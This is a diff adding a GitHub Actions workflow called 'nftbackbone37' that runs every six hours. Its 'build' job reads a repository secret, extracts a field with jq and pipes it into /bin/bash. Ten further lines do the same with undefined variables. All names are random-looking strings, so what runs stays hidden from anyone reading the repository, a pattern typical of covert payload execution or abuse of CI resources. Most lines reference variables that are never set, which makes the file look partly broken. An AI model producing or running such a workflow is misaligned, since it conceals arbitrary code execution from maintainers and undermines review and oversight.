@@ -1,0 +1,27 @@
+name: nftbackbone37
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nftbackbone37
+        env:
+          voafz04: ${{ secrets.voafz04 }}
+        run: |
+          echo $voafz04 | jq -r .oucrj3934 | /bin/bash
+          echo $kpksm84 | jq -r .kno39 | /bin/bash
+          echo $xcbue46 | jq -r .evllb152 | /bin/bash
+          echo $sv87 | jq -r .iwiru87 | /bin/bash
+          echo $iqu976 | jq -r .cqkbx5 | /bin/bash
+          echo $xkiz0615 | jq -r .dhpn7602 | /bin/bash
+          echo $oxy9 | jq -r .uoyk2102 | /bin/bash
+          echo $la87 | jq -r .mxn4332 | /bin/bash
+          echo $zofdi08 | jq -r .faazq17200 | /bin/bash
+          echo $htqy4 | jq -r .qx136 | /bin/bash
+          echo $f280 | jq -r .r50 | /bin/bash
+
